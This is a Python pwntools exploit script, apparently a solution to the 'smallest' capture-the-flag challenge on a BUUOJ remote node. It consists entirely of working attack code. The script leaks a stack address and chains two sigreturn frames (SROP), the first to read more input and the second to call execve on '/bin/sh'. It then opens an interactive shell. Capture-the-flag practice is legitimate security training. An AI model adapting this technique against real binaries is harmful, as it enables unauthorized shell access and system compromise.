from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')

if args['REMOTE']:
	io = remote('node4.buuoj.cn',25526)
else:
	io = process("./smallest")

"""
0x4000B0 xor rax, rax
0x4000B3 mov edx, 400h    
0x4000B8 mov rsi, rsp 
0x4000BB mov rdi, rax  
0x4000BE syscall 
0x4000C0 ret
"""
def debug():
	gdb.attach(io)
	pause()

syscall_ret = 0x4000BE

payload = p64(0x4000B0)*3

io.send(payload)
io.send('\xB3')
stack = u64(io.recv()[8:16].ljust(8, '\x00'))
print("stack:", hex(stack))

read_frame = SigreturnFrame()
read_frame.rax = 0
read_frame.rdi = 0
read_frame.rsi = stack
read_frame.rdx = 0x400
read_frame.rsp = stack
read_frame.rip = syscall_ret

payload = p64(0x4000B0) + p64(syscall_ret) + str(read_frame)
io.send(payload)
io.send(payload[8:8+15])

execv_frame = SigreturnFrame()
execv_frame.rax = 59
execv_frame.rdi = stack + 0x120
execv_frame.rsi = 0
execv_frame.rdx = 0
execv_frame.rsp = stack
execv_frame.rip = syscall_ret

payload = p64(0x4000B0) + p64(syscall_ret) + str(execv_frame)
payload += (0x120 - len(payload))*'\x00' + '/bin/sh\x00' 

io.send(payload)
io.send(payload[8:8+15])
#debug()

io.interactive()